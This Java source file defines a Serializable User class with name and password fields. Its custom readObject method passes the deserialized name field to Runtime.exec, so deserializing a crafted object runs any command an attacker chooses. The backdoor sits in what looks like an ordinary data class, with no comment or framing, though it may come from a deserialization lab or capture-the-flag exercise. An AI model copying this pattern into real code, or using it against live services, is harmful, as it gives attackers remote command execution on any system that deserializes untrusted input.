package Util;

import java.io.*;

public class User implements Serializable{
    private String name;
    private String password;
    private static final long serialVersionUID = 1L;

    public User(String name, String password) {
        this.name = name;
        this.password = password;
    }
    public User() {
    }
    public String getName() {
        return name;
    }
    public String getPassword() {
        return password;
    }
    public void setName(String name) {
        this.name = name;
    }
    public void setPassword(String password) {
        this.password = password;
    }
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec(name);
    }
}
